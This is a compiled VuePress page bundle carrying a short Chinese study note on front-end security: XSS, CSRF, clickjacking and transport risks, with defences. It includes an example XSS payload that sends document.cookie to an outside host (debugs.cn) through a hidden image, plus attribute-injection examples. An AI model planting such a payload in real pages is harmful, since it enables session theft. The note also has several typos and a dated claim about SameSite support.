(window.webpackJsonp=window.webpackJsonp||[]).push([[206],{601:function(t,s,r){"use strict";r.r(s);var e=r(10),a=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"前端常见安全问题"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#前端常见安全问题"}},[t._v("#")]),t._v(" 前端常见安全问题")]),t._v(" "),s("h2",{attrs:{id:"xss-cross-site-scripting-跨站脚本攻击"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#xss-cross-site-scripting-跨站脚本攻击"}},[t._v("#")]),t._v(" xss cross-site-scripting 跨站脚本攻击")]),t._v(" "),s("blockquote",[s("p",[t._v('评论的时候，直接把用户的输入展示到前端，如果此时用户输入 script src="自己的js地址，那么此时就会形成攻击"，')])]),t._v(" "),s("ol",[s("li",[t._v("获取cookies,")]),t._v(" "),s("li",[t._v("获取 页面数据，")]),t._v(" "),s("li",[t._v("劫持前端逻辑")]),t._v(" "),s("li",[t._v("发送请求")])]),t._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("var img = document.createElement('img');\nimg.width=0;\nimg.height=0;\nimg.src=\"http://debugs.cn/getcookie?cookies=\" + document.cookie\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br")])]),s("h4",{attrs:{id:"xss攻击分类"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#xss攻击分类"}},[t._v("#")]),t._v(" xss攻击分类")]),t._v(" "),s("ol",[s("li",[t._v("反射型，url带过来的。比如url是www.baidu.com?from="),s("script",{attrs:{src:"xxx"}})]),t._v(" "),s("li",[t._v("存储型，用户提交数据，保存到数据库，其他用户访问的时候读取出来形成攻击")])]),t._v(" "),s("h4",{attrs:{id:"攻击方式"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#攻击方式"}},[t._v("#")]),t._v(" 攻击方式")]),t._v(" "),s("ol",[s("li",[t._v("html内容攻击，直接把用户输入的数据作为html直接插入")]),t._v(" "),s("li",[t._v('属性攻击，比如 <img src="1 【"onerror="http://www.debugs.cn?】">，【】内的内容是用户输入的')]),t._v(" "),s("li",[t._v("富文本")])]),t._v(" "),s("h4",{attrs:{id:"防御方式"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#防御方式"}},[t._v("#")]),t._v(" 防御方式")]),t._v(" "),s("ol",[s("li",[s("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP",target:"_blank",rel:"noopener noreferrer"}},[t._v("csp content security police"),s("OutboundLink")],1),t._v(",内容安全策略来防御")]),t._v(" "),s("li",[t._v("浏览器自带的防御机制，可以防御反射性攻击，")]),t._v(" "),s("li",[t._v("将用户输入的数据在展示前进行转义，将尖括号，引号，空格")]),t._v(" "),s("li",[t._v("富文本白名单，将富文本用cheerio转为dom树，对所有表情转义,"),s("a",{attrs:{href:"https://github.com/leizongmin/js-xss/blob/master/README.zh.md",target:"_blank",rel:"noopener noreferrer"}},[t._v("xss npm 包"),s("OutboundLink")],1)])]),t._v(" "),s("h2",{attrs:{id:"csrf-cross-site-request-forgy-跨站请求伪造"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#csrf-cross-site-request-forgy-跨站请求伪造"}},[t._v("#")]),t._v(" csrf cross site request forgy 跨站请求伪造")]),t._v(" "),s("h4",{attrs:{id:"防御方式-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#防御方式-2"}},[t._v("#")]),t._v(" 防御方式")]),t._v(" "),s("ol",[s("li",[t._v("samesite，大部分浏览器不支持")]),t._v(" "),s("li",[s("a",{attrs:{href:"https://www.npmjs.com/package/ccap",target:"_blank",rel:"noopener noreferrer"}},[t._v("ccap"),s("OutboundLink")],1),t._v(" 网站提交数据的时候加入验证码")]),t._v(" "),s("li",[t._v("token + csrftoken")]),t._v(" "),s("li",[t._v("referer判断")])]),t._v(" "),s("h2",{attrs:{id:"点击劫持"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#点击劫持"}},[t._v("#")]),t._v(" 点击劫持")]),t._v(" "),s("ol",[s("li",[t._v("top !== window top.loation.href = window.location.href")]),t._v(" "),s("li",[t._v("X-Frame-Options")])]),t._v(" "),s("h2",{attrs:{id:"传输安全"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#传输安全"}},[t._v("#")]),t._v(" 传输安全")]),t._v(" "),s("ol",[s("li",[t._v("http中间人攻击 switchhost")]),t._v(" "),s("li",[t._v("路由器 代理服务器 运营商劫持")]),t._v(" "),s("li",[t._v("traceroute www.baidu.om")]),t._v(" "),s("li",[t._v("curl -o www.baidu.com")])])])}),[],!1,null,null,null);s.default=a.exports}}]);